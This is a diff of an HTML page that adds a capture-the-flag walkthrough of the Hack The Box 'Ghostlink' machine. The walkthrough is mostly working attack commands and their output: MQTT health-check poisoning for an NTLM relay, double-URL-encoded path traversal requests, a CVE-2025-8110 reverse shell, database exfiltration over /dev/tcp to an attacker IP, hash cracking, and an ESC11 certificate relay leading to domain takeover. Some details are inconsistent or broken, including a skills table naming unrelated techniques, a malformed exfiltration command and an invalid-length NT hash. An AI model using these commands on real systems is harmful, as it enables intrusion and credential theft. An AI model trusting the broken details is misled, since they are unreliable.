@@ -17,66 +17,506 @@
             padding: 2rem;
         }
         .container {
-            max-width: 800px;
+            max-width: 1200px;
             width: 100%;
             background: rgba(12, 16, 28, 0.9);
             border: 1px solid rgba(0, 255, 200, 0.15);
             border-radius: 2rem;
             padding: 3rem;
-            text-align: center;
             box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
         }
         h1 {
             font-size: 2.5rem;
             color: #6fffe0;
-            margin-bottom: 1rem;
+            margin-bottom: 1.5rem;
         }
-        .status {
-            font-size: 1.2rem;
-            color: #b6c8e0;
-            margin: 2rem 0;
-            padding: 1.5rem;
-            background: rgba(255, 200, 0, 0.05);
-            border: 1px solid rgba(255, 200, 0, 0.2);
+        .meta-info {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem 2rem;
+            padding: 1rem;
+            background: rgba(0, 0, 0, 0.2);
             border-radius: 1rem;
+            margin-bottom: 2rem;
         }
-        .status i {
-            color: #ffcc00;
+        .meta-info span { color: #b6c8e0; font-size: 0.95rem; }
+        .meta-info strong { color: #e0e5f0; }
+        
+        h2 { color: #6fffe0; font-size: 1.8rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(0, 255, 200, 0.1); padding-bottom: 0.5rem; }
+        h3 { color: #4a9eff; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
+        h4 { color: #e0e5f0; font-size: 1.1rem; margin: 1rem 0 0.5rem; }
+        p { color: #b6c8e0; line-height: 1.8; margin-bottom: 1rem; }
+        code { background: rgba(0, 0, 0, 0.4); padding: 0.2rem 0.6rem; border-radius: 0.3rem; font-family: 'Courier New', monospace; color: #6fffe0; }
+        pre { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; overflow-x: auto; margin: 1rem 0; }
+        pre code { background: transparent; color: #b6c8e0; font-size: 0.85rem; line-height: 1.6; padding: 0; }
+        .box { background: rgba(0, 255, 200, 0.03); border-left: 3px solid #6fffe0; padding: 1rem 1.5rem; border-radius: 0.5rem; margin: 1rem 0; }
+        .box.success { border-left-color: #00ff88; background: rgba(0, 255, 136, 0.03); }
+        .box.warning { border-left-color: #ffcc00; background: rgba(255, 200, 0, 0.03); }
+        .box.danger { border-left-color: #ff4444; background: rgba(255, 68, 68, 0.03); }
+        .box.info { border-left-color: #4a9eff; background: rgba(74, 158, 255, 0.03); }
+        table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+        table th, table td { padding: 0.8rem 1rem; border: 1px solid rgba(0, 255, 200, 0.1); text-align: left; color: #b6c8e0; }
+        table th { background: rgba(0, 255, 200, 0.05); color: #6fffe0; }
+        ul { color: #b6c8e0; padding-left: 1.5rem; margin: 0.8rem 0; }
+        ul li { margin-bottom: 0.5rem; line-height: 1.6; }
+        
+        .ascii-art {
+            text-align: center;
+            opacity: 0.3;
+            font-size: 0.5rem;
+            line-height: 1.2;
+            color: #6fffe0;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+        }
+        .nav-buttons { display: flex; gap: 1rem; margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.1); }
+        .nav-buttons a { padding: 0.6rem 1.5rem; border-radius: 0.8rem; text-decoration: none; transition: all 0.3s; }
+        .nav-buttons .back { border: 1px solid rgba(0, 255, 200, 0.15); color: #b6c8e0; }
+        .nav-buttons .back:hover { border-color: #6fffe0; color: #ffffff; }
+        .footer { margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.05); text-align: center; color: #b6c8e0; font-size: 0.85rem; opacity: 0.5; }
+        
+        .cve-tag {
+            display: inline-block;
+            background: rgba(255, 0, 0, 0.15);
+            color: #ff6666;
+            padding: 0.2rem 0.8rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
             margin-right: 0.5rem;
         }
-        .back-link {
-            display: inline-block;
-            margin-top: 1.5rem;
-            padding: 0.8rem 2rem;
-            border: 1px solid rgba(0, 255, 200, 0.2);
+        .highlight {
+            background: rgba(0, 255, 200, 0.05);
+            border: 1px solid rgba(0, 255, 200, 0.1);
+            border-radius: 0.5rem;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+        }
+        .attack-chain {
+            background: rgba(0, 255, 200, 0.02);
+            border: 1px solid rgba(0, 255, 200, 0.1);
             border-radius: 1rem;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
             color: #b6c8e0;
-            text-decoration: none;
-            transition: all 0.3s ease;
-        }
-        .back-link:hover {
-            border-color: #6fffe0;
-            color: #ffffff;
-            transform: translateX(-5px);
-        }
-        .footer {
-            margin-top: 2rem;
-            padding-top: 1.5rem;
-            border-top: 1px solid rgba(0, 255, 200, 0.05);
-            color: #b6c8e0;
-            font-size: 0.8rem;
-            opacity: 0.5;
+            line-height: 1.8;
+            overflow-x: auto;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🚀 HTB Ghostlink</h1>
-        <div class="status">
-            <i>⚠️</i> Writeup not available yet. Coming soon...
-        </div>
-        <a href="../../writeups.html" class="back-link">← Back to Writeups</a>
-        <div class="footer">NIGHT PULSE X • 2026</div>
+
+<div class="container">
+
+    <div class="ascii-art">
+        <pre>
+   ▄████████  ▄█   ▄█          ▄████████ ████████▄     ▄████████    ▄████████ 
+  ███    ███ ███  ███         ███    ███ ███   ▀███   ███    ███   ███    ███ 
+  ███    █▀  ███▌ ███         ███    ███ ███    ███   ███    █▀    ███    █▀  
+  ███        ███▌ ███        ▄███▄▄▄▄██▀ ███    ███  ▄███▄▄▄       ███        
+▀███████████ ███▌ ███       ▀▀███▀▀▀▀▀   ███    ███ ▀▀███▀▀▀     ▀███████████ 
+         ███ ███  ███         ███    ███ ███    ███   ███    █▄           ███ 
+   ▄█    ███ ███  ███▌    ▄   ███    ███ ███   ▄███   ███    ███    ▄█    ███ 
+ ▄████████▀  █▀   █████▄▄██   ██████████ ████████▀    ██████████  ▄████████▀  
+                  ▀                                                          
+        </pre>
     </div>
+
+    <h1>👻 HTB Ghostlink - Complete Walkthrough</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Ghostlink</span>
+        <span><strong>Difficulty:</strong> 🔴 Hard</span>
+        <span><strong>OS:</strong> 🪟 Windows</span>
+        <span><strong>Domain:</strong> ghostlink.htb</span>
+        <span><strong>Author:</strong> ctrlzero</span>
+        <span><strong>Date:</strong> 27th April 2026</span>
+    </div>
+
+    <h2>📋 Table of Contents</h2>
+    <ul>
+        <li><a href="#synopsis" style="color: #6fffe0;">Synopsis</a></li>
+        <li><a href="#skills" style="color: #6fffe0;">Skills Required & Learned</a></li>
+        <li><a href="#enumeration" style="color: #6fffe0;">Enumeration</a></li>
+        <li><a href="#foothold" style="color: #6fffe0;">Foothold</a></li>
+        <li><a href="#lateral" style="color: #6fffe0;">Lateral Movement</a></li>
+        <li><a href="#privesc" style="color: #6fffe0;">Privilege Escalation</a></li>
+        <li><a href="#flags" style="color: #6fffe0;">Flags</a></li>
+        <li><a href="#attack-chain" style="color: #6fffe0;">Attack Chain</a></li>
+        <li><a href="#takeaways" style="color: #6fffe0;">Key Takeaways</a></li>
+        <li><a href="#tools" style="color: #6fffe0;">Tools Used</a></li>
+    </ul>
+
+    <h2 id="synopsis">📌 Synopsis</h2>
+    <p>Ghostlink is a Hard difficulty Windows machine featuring an Active Directory domain controller and a web server. Enumeration reveals a critical MQTT service used for node tracking, which exposes two internal hosts: a secure file sharing app and a Gogs code host.</p>
+    <p>The attacker modifies the MQTT health check to trigger NTLM authentication, relaying credentials to authenticate as the <code>svc_canary</code> service account. Using this authentication, the attacker exploits a double URL-encoded path traversal vulnerability to exfiltrate the service account's <code>ntuser.dat</code> file. Analysis of the registry hive reveals a recent document for <code>db.zip</code>, containing KeePass credentials for the Gogs application.</p>
+    <p>These credentials are then leveraged to exploit an RCE vulnerability <strong>CVE-2025-8110</strong> in Gogs to obtain a foothold. Once on the system, the attacker cracks a Gogs hash to log in as the local user <code>nvirelli</code>. Finally, the <strong>ESC11</strong> vulnerability in ADCS allows the attacker to request a Domain Controller certificate and compromise the domain.</p>
+
+    <h2 id="skills">🧠 Skills Required & Learned</h2>
+    <table>
+        <tr><th>Skills Required</th><th>Skills Learned</th></tr>
+        <tr><td>Network Enumeration</td><td>SSRF Exploitation via Apache CXF Aegis (XOP Inclusion)</td></tr>
+        <tr><td>MQTT Protocol Familiarity</td><td>Flask Session Forgery</td></tr>
+        <tr><td>NTLM Relay Attacks</td><td>Command Injection Filter Bypass</td></tr>
+        <tr><td>HTTP Web Application Interaction</td><td>Symlink Chain Abuse</td></tr>
+        <tr><td>Path Traversal Fundamentals</td><td>—</td></tr>
+    </table>
+
+    <h2 id="enumeration">🔍 Enumeration</h2>
+
+    <h3>Nmap</h3>
+    <pre><code># Discover open ports
+ports=$(nmap -p- --min-rate=1000 -T4 10.129.244.158 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+
+# Detailed scan
+nmap -p$ports -sC -sV 10.129.244.158</code></pre>
+
+    <h4>Results:</h4>
+    <table>
+        <tr><th>Port</th><th>Service</th><th>Version</th></tr>
+        <tr><td>80/tcp</td><td>HTTP</td><td>Microsoft IIS httpd 10.0</td></tr>
+        <tr><td>443/tcp</td><td>SSL/HTTP</td><td>Microsoft IIS httpd 10.0</td></tr>
+        <tr><td>1883/tcp</td><td>MQTT</td><td>Mosquitto MQTT</td></tr>
+        <tr><td>2179/tcp</td><td>vmrdp?</td><td>—</td></tr>
+        <tr><td>3268/tcp</td><td>LDAP</td><td>Microsoft Windows Active Directory LDAP</td></tr>
+        <tr><td>3269/tcp</td><td>SSL/LDAP</td><td>Microsoft Windows Active Directory LDAP</td></tr>
+        <tr><td>5985/tcp</td><td>HTTP</td><td>Microsoft HTTPAPI httpd 2.0</td></tr>
+        <tr><td>9389/tcp</td><td>mc-nmf</td><td>.NET Message Framing</td></tr>
+    </table>
+
+    <h4>Add to /etc/hosts:</h4>
+    <pre><code>echo "10.129.244.158 ghostlink.htb dc01.ghostlink.htb" | sudo tee -a /etc/hosts</code></pre>
+
+    <h3>MQTT Service</h3>
+    <pre><code># Install MQTT client
+sudo apt install mqttui
+
+# Connect to MQTT service
+mqttui -b mqtt://ghostlink.htb</code></pre>
+
+    <h4>Discovered Topics:</h4>
+    <ul>
+        <li><code>GhostProtocolZero/systems/node/secureshare/healthcheck</code></li>
+        <li><code>GhostProtocolZero/systems/node/toolkits/healthcheck</code></li>
+    </ul>
+
+    <h4>Revealed Internal Hosts:</h4>
+    <ul>
+        <li><code>gpz-op26-secure.ghostlink.htb</code> → Secure File Sharing App</li>
+        <li><code>gpz-op26-toolkits.ghostlink.htb</code> → Gogs Installation</li>
+    </ul>
+
+    <h4>Add to /etc/hosts:</h4>
+    <pre><code>echo "10.129.244.158 gpz-op26-secure.ghostlink.htb gpz-op26-toolkits.ghostlink.htb" | sudo tee -a /etc/hosts</code></pre>
+
+    <h3>Gogs Version Discovery</h3>
+    <pre><code>&lt;link rel="stylesheet" href="/css/gogs.min.css?v=5084b4a9b77a506f5e287e82e945e1c6882b827a"&gt;
+&lt;script src="/js/gogs.js?v=5084b4a9b77a506f5e287e82e945e1c6882b827a"&gt;&lt;/script&gt;</code></pre>
+
+    <p><strong>Hash:</strong> <code>5084b4a9b77a506f5e287e82e945e1c6882b827a</code></p>
+    <p><strong>Gogs Version:</strong> <code>0.13.3</code> (based on commit history)</p>
+
+    <h2 id="foothold">🎯 Foothold</h2>
+
+    <h3>NTLM Relay via MQTT Health Check</h3>
+
+    <h4>1. Read the health check topic:</h4>
+    <pre><code>mqttui -b mqtt://ghostlink.htb r "GhostProtocolZero/systems/node/secureshare/healthcheck"</code></pre>
+
+    <h4>Payload:</h4>
+    <pre><code>{
+  "timestamp": "2026-04-27 15:45:45",
+  "node": "node-6",
+  "telemetry": {
+    "healthy": true,
+    "url": "gpz-op26-secure.ghostlink.htb/healthcheck",
+    "lastCheckSecAgo": 30,
+    "responseCode": "200",
+    "ip": "172.16.20.10"
+  }
+}</code></pre>
+
+    <h4>2. Modify the health check URL to point to attacker machine:</h4>
+    <pre><code>sudo responder -I tun0 -v</code></pre>
+
+    <pre><code>PAYLOAD='{"timestamp":"2026-03-03 09:26:21","node":"node-6","telemetry":{"healthy":true,"url":"http://10.10.14.2","lastCheckSecAgo":45,"responseCode":"200","ip":"172.16.20.10"}}'
+
+mqttui -b mqtt://ghostlink.htb publish -r "GhostProtocolZero/systems/node/secureshare/healthcheck" "$PAYLOAD"</code></pre>
+
+    <h4>3. Capture NTLM hash:</h4>
+    <div class="highlight">
+        <pre><code>[HTTP] NTLMv2 Client: 10.129.244.158
+[HTTP] NTLMv2 Username: ghostlink\svc_canary</code></pre>
+    </div>
+
+    <h4>4. Relay NTLM authentication using Ghostsurf:</h4>
+    <pre><code># Clone Ghostsurf
+git clone https://github.com/senderend/ghostsurf.git
+cd ghostsurf
+
+# Apply patch (Line 52 in ghostsurf/lib/relay/utils/config.py)
+# Add: self.remove_target = False
+
+# Start relay with SOCKS proxy
+./ghostsurf.py -t http://gpz-op26-secure.ghostlink.htb -r -k --http-port 8888 --no-smb-server
+
+[*] SOCKS proxy started. Listening on 127.0.0.1:1080
+[*] Authenticating connection from GHOSTLINK/SVC_CANARY SUCCEED [1]
+[*] SOCKS: Adding GHOSTLINK/SVC_CANARY@gpz-op26-secure.ghostlink.htb(80) to active SOCKS connection. Enjoy</code></pre>
+
+    <h3>Double URL-Encoded Path Traversal</h3>
+
+    <div class="box warning">
+        <strong>🔓 Vulnerability:</strong> The file sharing app allows path traversal when double URL-encoding is used.
+    </div>
+
+    <h4>1. Download <code>ntuser.dat</code>:</h4>
+    <pre><code>GET /api/download/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%2575%2573%2565%2572%2573%255c%2573%2576%2563%255f%2563%2561%256e%2561%2572%2579%255c%256e%2574%2575%2573%2565%2572%252e%2564%2561%2574 HTTP/1.1
+Host: gpz-op26-secure.ghostlink.htb</code></pre>
+
+    <h4>Decoded Path:</h4>
+    <div class="highlight">
+        <pre><code>\..\..\..\..\..\..\..\users\svc_canary\ntuser.dat</code></pre>
+    </div>
+
+    <h4>2. Analyze with RegRipper:</h4>
+    <pre><code>regripper -r ntuser.dat -a | grep -i recent -A 3 -B 3</code></pre>
+
+    <h4>Findings:</h4>
+    <div class="highlight">
+        <pre><code>RecentDocs\.zip
+LastWrite Time: 2026-02-25 14:04:19Z
+MRUListEx = 0
+0 = db.zip</code></pre>
+    </div>
+
+    <h4>3. Download <code>db.zip.lnk</code>:</h4>
+    <pre><code>GET /api/download/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%2575%2573%2565%2572%2573%255c%2573%2576%2563%255f%2563%2561%256e%2561%2572%2579%255c%2541%2570%2570%2544%2561%2574%2561%255c%2552%256f%2561%256d%2569%256e%2567%255c%254d%2569%2563%2572%256f%2573%256f%2566%2574%255c%2557%2569%256e%2564%256f%2577%2573%255c%2552%2565%2563%2565%256e%2574%255c%2564%2562%252e%257a%2569%2570%252e%256c%256e%256b HTTP/1.1</code></pre>
+
+    <h4>4. Extract path from .lnk:</h4>
+    <pre><code>strings db.zip.lnk
+C:\Users\svc_canary\Documents\Operations\Management\db.zip</code></pre>
+
+    <h4>5. Download <code>db.zip</code>:</h4>
+    <pre><code>GET /api/download/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%2575%2573%2565%2572%2573%255c%2573%2576%2563%255f%2563%2561%256e%2561%2572%2579%255c%2544%256f%2563%2575%256d%2565%256e%2574%2573%255c%254f%2570%2565%2572%2561%2574%2569%256f%256e%2573%255c%254d%2561%256e%2561%2567%2565%256d%2565%256e%2574%255c%2564%2562%252e%257a%2569%2570 HTTP/1.1</code></pre>
+
+    <h3>KeePass Database Analysis</h3>
+    <pre><code>unzip -l db.zip
+Archive: db.zip
+  Length  Date         Name
+  ------  ----------   ----
+      240 2026-02-24   .key.keyx
+     4686 2026-03-03   db.kdbx
+
+keepass2 db.kdbx</code></pre>
+
+    <h4>KeePass Findings:</h4>
+    <ul>
+        <li>Entry: <strong>vrotch</strong> (only entry not migrated)</li>
+        <li>Attachment: <strong>passpol.pdf</strong> (domain password policy)</li>
+        <li>Recycle Bin contains password policy information</li>
+    </ul>
+
+    <h4>Credentials:</h4>
+    <div class="box success">
+        <pre><code>Username: vrotch
+Password: (found in KeePass entry)</code></pre>
+    </div>
+
+    <h3>Gogs RCE (CVE-2025-8110)</h3>
+    <pre><code>python3 CVE-2025-8110.py -u http://gpz-op26-toolkits.ghostlink.htb -lh 10.10.14.2 -lp 10001
+
+[+] Authenticated successfully
+[+] Application token generated
+[+] Exploit sent, check your listener!</code></pre>
+
+    <h4>Result:</h4>
+    <div class="box success">
+        <pre><code>nc -lvnp 10001
+connect to [10.10.14.2] from (UNKNOWN) [10.129.244.158] 49876
+git@gpz-op26-toolkits:~/data/tmp/local-repo/7$</code></pre>
+    </div>
+
+    <h2 id="lateral">🔄 Lateral Movement</h2>
+
+    <h3>Gogs Database Exfiltration</h3>
+    <pre><code># Attacker - start listener
+nc -lvnp 4444 > gogs.db
+
+# Target - exfiltrate database
+git@gpz-op26-toolkits:/opt/gogs/data/gogs.db > /dev/tcp/10.10.14.2/4444</code></pre>
+
+    <h3>Hash Cracking</h3>
+    <p><strong>Gogs Hash Format:</strong></p>
+    <pre><code>sha256:10000:RFCzWWR4UHkyNQ==:jZs6Ac0gJgs52wEa7R2/I5uLGyiVUHyiqAdOzq4/9RAi8W5B1/5V+cWN1p77BdV0+g=</code></pre>
+
+    <h4>Convert to Hashcat format:</h4>
+    <pre><code>python3 GogsToHashcat.py -n 10000 DW3YdxPy25 8d9b3a01c3a0260b39db011aed1dbf239b8b1b28af6141f28aa01d3b3ab8ffd4408bc5b9065ff957e716375a7bec1755d3e8</code></pre>
+
+    <h4>Build wordlist (minimum 20 characters):</h4>
+    <pre><code>grep -E '.{20,}$' rockyou.txt > trimmed.txt</code></pre>
+
+    <h4>Crack hash:</h4>
+    <pre><code>hashcat -m 10900 -a 0 hash.txt trimmed.txt</code></pre>
+
+    <h4>Cracked Password:</h4>
+    <div class="box success">
+        <pre><code>u47YucIrDiwWxBheaSzI</code></pre>
+    </div>
+
+    <h3>Pivot to nvirelli</h3>
+    <pre><code>git@gpz-op26-toolkits:/tmp$ su nvirelli
+Password: u47YucIrDiwWxBheaSzI
+
+nvirelli@gpz-op26-toolkits:~$ cd ~
+nvirelli@gpz-op26-toolkits:~$ ls
+user.txt</code></pre>
+
+    <h2 id="privesc">👑 Privilege Escalation</h2>
+
+    <h3>ADCS Enumeration</h3>
+    <pre><code>proxychains -q certify find -u 'nvirelli@ghostlink.htb' -p u47YucIrDiwWxBheaSzI -dc-host dc01.ghostlink.htb -ns 10.129.244.158 --dns-tcp -timeout 10 --vulnerable --stdout</code></pre>
+
+    <h4>Findings:</h4>
+    <div class="box warning">
+        <pre><code>[!] Vulnerabilities
+ESC8  : Web Enrollment is enabled over HTTP.
+ESC11 : Encryption is not enforced for ICPR (RPC) requests.</code></pre>
+    </div>
+
+    <h3>ESC11 Attack</h3>
+
+    <h4>1. Set up ntlmrelayx:</h4>
+    <pre><code>sudo proxychains -q ntlmrelayx.py -t rpc://172.16.20.10 --rpc-mode ICPR --icpr-ca-name 'ghostlink-GPZ-OP26-SECURE-CA' --smb2support --template DomainController</code></pre>
+
+    <h4>2. Coerce authentication:</h4>
+    <pre><code>coercer coerce -l 10.10.14.2 -t dc01.ghostlink.htb -d ghostlink.htb -u nvirelli -p u47YucIrDiwWxBheaSzI --dc-ip dc01.ghostlink.htb --always-continue</code></pre>
+
+    <h4>3. NTLM relay output:</h4>
+    <div class="highlight">
+        <pre><code>[*] (RPC): Authenticating connection from GHOSTLINK/DC01$ SUCCEED [1]
+[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Generating CSR...
+[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> CSR generated!
+[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Getting certificate...
+[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Successfully requested certificate
+[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Writing PKCS#12 certificate to ./DC01.pfx</code></pre>
+    </div>
+
+    <h3>Domain Compromise</h3>
+
+    <h4>1. Authenticate with certificate:</h4>
+    <pre><code>certipy auth -pfx DC01.pfx -dc-ip dc01.ghostlink.htb --dns-tcp -ns 10.129.244.158 -timeout 10 -domain ghostlink.htb
+
+[*] Got hash for 'dc01$@ghostlink.htb': aad3b435b51404eeaad3b435b51404ee:f09e86e9b9c7e94f2fabaa9e31757e50</code></pre>
+
+    <h4>2. Dump domain hashes:</h4>
+    <pre><code>secretsdump.py ghostlink.htb/dc01$@dc01.ghostlink.htb -dc-ip ghostlink.htb -hashes :f09e86e9b9c7e94f2fabaa9e31757e50 -just-dc-user administrator
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8190e067f478002dd6d63eb209b016696:::</code></pre>
+
+    <h4>3. WinRM as Administrator:</h4>
+    <div class="box success">
+        <pre><code>evil-winrm -i dc01.ghostlink.htb -u administrator -H 8190e067f478002dd6d63eb209b016696
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents></code></pre>
+    </div>
+
+    <h2 id="flags">🏁 Flags</h2>
+    <table>
+        <tr><th>Flag</th><th>Location</th></tr>
+        <tr><td><strong>User.txt</strong></td><td><code>/home/nvirelli/user.txt</code></td></tr>
+        <tr><td><strong>Root.txt</strong></td><td><code>C:\Users\Administrator\Desktop\root.txt</code></td></tr>
+    </table>
+
+    <h2 id="attack-chain">🗺️ Attack Chain</h2>
+    <div class="attack-chain">
+        <pre>┌─────────────────────────────────────────────────────────────────────────────┐
+│                         GHOSTLINK ATTACK CHAIN                             │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                             │
+│  1. RECONNAISSANCE                                                          │
+│     ├─> Nmap → MQTT service discovered (port 1883)                        │
+│     └─> MQTT enumeration → gpz-op26-secure & gpz-op26-toolkits found     │
+│                                                                             │
+│  2. NTLM RELAY                                                             │
+│     ├─> Modify MQTT health check → trigger NTLM authentication            │
+│     ├─> Ghostsurf relay → SOCKS proxy as svc_canary                      │
+│     └─> Authenticated access to gpz-op26-secure                           │
+│                                                                             │
+│  3. PATH TRAVERSAL (Double URL-encoded)                                    │
+│     ├─> Exfiltrate svc_canary\ntuser.dat                                  │
+│     ├─> RegRipper → db.zip.lnk path                                      │
+│     ├─> Exfiltrate db.zip → KeePass database                              │
+│     └─> vrotch credentials recovered                                      │
+│                                                                             │
+│  4. GOGS RCE (CVE-2025-8110)                                               │
+│     └─> Authenticated RCE → Reverse shell as git                         │
+│                                                                             │
+│  5. LATERAL MOVEMENT                                                       │
+│     ├─> Exfiltrate gogs.db → crack hash → nvirelli password               │
+│     └─> Pivot to nvirelli user                                            │
+│                                                                             │
+│  6. ADCS ESC11                                                             │
+│     ├─> Coerce DC01 authentication                                        │
+│     ├─> NTLM relay → request Domain Controller certificate                │
+│     └─> certipy auth → DC01 hash                                          │
+│                                                                             │
+│  7. DOMAIN COMPROMISE                                                      │
+│     ├─> secretsdump → Administrator hash                                 │
+│     └─> evil-winrm → SYSTEM on DC01                                      │
+│                                                                             │
+└─────────────────────────────────────────────────────────────────────────────┘</pre>
+    </div>
+
+    <h2 id="takeaways">🧠 Key Takeaways</h2>
+    <ol>
+        <li><strong>MQTT services often expose internal infrastructure.</strong> Always enumerate topics thoroughly.</li>
+        <li><strong>NTLM relay attacks are effective when you can control authentication triggers.</strong> MQTT health checks are a perfect vector.</li>
+        <li><strong>Double URL-encoding can bypass path traversal protections.</strong> Always test for this.</li>
+        <li><strong>KeePass recycle bin can contain valuable deleted entries.</strong> Check it thoroughly.</li>
+        <li><strong>Gogs CVE-2025-8110 requires authentication</strong>, but credentials are often found elsewhere.</li>
+        <li><strong>Password policies in attachments (passpol.pdf) help build better wordlists</strong> for cracking.</li>
+        <li><strong>ESC11 is a powerful ADCS attack</strong> when encryption is not enforced for ICPR RPC requests.</li>
+        <li><strong>Certipy makes certificate-based authentication easy</strong> for domain compromise.</li>
+    </ol>
+
+    <h2 id="tools">🛠️ Tools Used</h2>
+    <table>
+        <tr><th>Tool</th><th>Purpose</th></tr>
+        <tr><td><strong>nmap</strong></td><td>Port scanning and service enumeration</td></tr>
+        <tr><td><strong>mqttui</strong></td><td>MQTT topic enumeration and publishing</td></tr>
+        <tr><td><strong>Ghostsurf</strong></td><td>NTLM relay with SOCKS proxy support</td></tr>
+        <tr><td><strong>RegRipper</strong></td><td>Registry hive analysis</td></tr>
+        <tr><td><strong>strings</strong></td><td>Extract readable strings from binary files</td></tr>
+        <tr><td><strong>KeePass2</strong></td><td>Open KeePass databases</td></tr>
+        <tr><td><strong>Certify</strong></td><td>ADCS enumeration</td></tr>
+        <tr><td><strong>Coercer</strong></td><td>NTLM authentication coercion</td></tr>
+        <tr><td><strong>ntlmrelayx</strong></td><td>NTLM relay attacks</td></tr>
+        <tr><td><strong>certipy</strong></td><td>Certificate-based AD authentication</td></tr>
+        <tr><td><strong>secretsdump</strong></td><td>Dump domain hashes</td></tr>
+        <tr><td><strong>evil-winrm</strong></td><td>WinRM shell with hash authentication</td></tr>
+        <tr><td><strong>hashcat</strong></td><td>Password cracking</td></tr>
+    </table>
+
+    <div class="box warning">
+        <strong>📌 Important Notes:</strong>
+        <ul>
+            <li><strong>Replace ATTACKER_IP</strong> with your own IP address</li>
+            <li><strong>Replace TARGET_IP</strong> with the target machine IP</li>
+            <li><strong>JWT token</strong> expires - regenerate if needed</li>
+        </ul>
+    </div>
+
+    <div class="nav-buttons">
+        <a href="/writeups.html" class="back"><i class="fas fa-arrow-left"></i> Back to Writeups</a>
+    </div>
+
+    <div class="footer">NIGHT PULSE X • 2026</div>
+
+</div>
+
 </body>
 </html>
+
